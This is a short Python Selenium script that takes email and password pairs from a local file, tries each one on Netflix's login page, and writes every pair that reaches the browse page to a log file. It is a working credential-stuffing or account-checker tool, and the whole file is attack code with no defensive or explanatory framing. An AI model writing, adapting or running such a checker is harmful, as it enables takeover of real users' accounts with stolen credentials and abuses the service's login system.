from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import parse_login_data
import logging

logging.basicConfig(filename='logs.log', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

def login_attempt(url, credentials):
    
    driver = webdriver.Chrome()
    driver.get(url)

    time.sleep(2)

    # print(credentials)
    for idx  in range(len(credentials)):
        email = credentials[idx]['email']
        password = credentials[idx]['password']
        print(email, password)
        
        email_elem = driver.find_element(By.ID, "id_userLoginId")
        email_elem.clear()
        email_elem.send_keys(email)

        # time.sleep(4)
        pass_elem = driver.find_element(By.ID, "id_password")
        pass_elem.clear()
        pass_elem.send_keys(password)

        submit_but = driver.find_element(By.CLASS_NAME, "btn-submit")
        submit_but.click()
        # # print(email, pass)
        time.sleep(3)

        # successfully logged in
        if driver.current_url == 'https://www.netflix.com/browse':
            logging.info(f'{email}:{password}')
            
            driver.delete_all_cookies()
            # wait to clear all cookies
            time.sleep(5)

            # navigate to login url
            driver.get(url)
            time.sleep(3)
        elif driver.current_url != url:
            driver.get(url)
            time.sleep(3)
        
    driver.close()


file_path = "./data.txt"
credentials = parse_login_data.parse_data(file_path)

# print(credentials)
url = 'https://www.netflix.com/in/login'
login_attempt(url, credentials)
